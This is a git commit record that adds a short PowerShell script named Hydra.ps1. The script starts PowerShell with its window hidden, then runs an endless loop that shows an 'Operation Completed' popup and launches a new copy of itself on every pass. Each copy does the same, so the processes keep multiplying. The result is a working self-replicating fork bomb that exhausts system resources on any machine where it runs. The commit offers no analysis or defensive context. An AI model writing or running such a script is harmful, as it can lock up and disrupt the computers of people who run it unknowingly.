2cdb6c71714ee127fdd831d56a89a9d20d70ac42
Babyporkchop <93239527+Babyporkchop@users.noreply.github.com>
2022-11-03 09:48:31 +0800

    Add files via upload

---
+++ Hydra/Hydra.ps1
@@ -0,0 +1,8 @@
+﻿Powershell.exe -windowstyle hidden {
+$app = "cmd.exe"
+$wshell = New-Object -ComObject Wscript.Shell
+while ($true){
+$wshell.Popup("Operation Completed",0,"Done",0x1)
+Start-Process powershell.exe -Argumentlist "-file .\Hydra.ps1"
+}
+}
